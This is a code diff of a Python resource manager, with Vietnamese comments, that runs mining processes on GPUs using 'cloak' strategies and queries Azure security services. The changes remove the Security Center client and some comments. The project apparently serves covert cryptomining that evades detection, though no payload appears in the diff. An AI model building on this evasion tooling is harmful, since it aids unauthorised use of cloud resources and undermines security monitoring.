@@ -19,11 +19,10 @@ from .base_manager import BaseManager
 from .utils import MiningProcess, GPUManager
 from .cloak_strategies import CloakStrategy, CloakStrategyFactory
 
-# Đã bỏ import AzureMonitorClient và AzureMLClient
+# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureSecurityCenterClient
 from .azure_clients import (
     AzureSentinelClient,
     AzureLogAnalyticsClient,
-    AzureSecurityCenterClient,
     AzureNetworkWatcherClient,
     AzureTrafficAnalyticsClient,
     AzureAnomalyDetectorClient,
@@ -420,9 +419,6 @@ class SharedResourceManager:
 
 
 class ResourceManager(BaseManager):
-    """
-    Quản lý chính tài nguyên, thread, v.v.
-    """
     _instance = None
     _instance_lock = Lock()
 
@@ -451,7 +447,7 @@ class ResourceManager(BaseManager):
         self.mining_processes_lock = rwlock.RWLockFair()
         self._counter = count()
 
-        # Azure (đã bỏ AzureMonitorClient, AzureMLClient)
+        # Azure (đã bỏ AzureSecurityCenterClient)
         self.initialize_azure_clients()
         self.discover_azure_resources()
 
@@ -501,7 +497,7 @@ class ResourceManager(BaseManager):
     def initialize_azure_clients(self):
         self.azure_sentinel_client = AzureSentinelClient(self.logger)
         self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
-        self.azure_security_center_client = AzureSecurityCenterClient(self.logger)
+        # ĐÃ BỎ self.azure_security_center_client
         self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
         self.azure_traffic_analytics_client = AzureTrafficAnalyticsClient(self.logger)
         self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
@@ -523,10 +519,6 @@ class ResourceManager(BaseManager):
             self.logger.info(
                 f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
             )
-
-            # Bỏ tất cả code liên quan đến AzureMLClient
-            # self.ml_clusters = self.azure_ml_client.discover_ml_clusters()
-            # self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
 
         except Exception as e:
             self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")
@@ -756,8 +748,6 @@ class ResourceManager(BaseManager):
             try:
                 item = self.resource_adjustment_queue.get(timeout=1)
 
-                # Có 2 trường hợp item là tuple 2 phần tử hoặc 3 phần tử 
-                # (tùy logic put() ở từng nơi). Xử lý linh hoạt:
                 if isinstance(item, tuple) and len(item) == 2:
                     # (priority, adjustment_task)
                     priority, adjustment_task = item
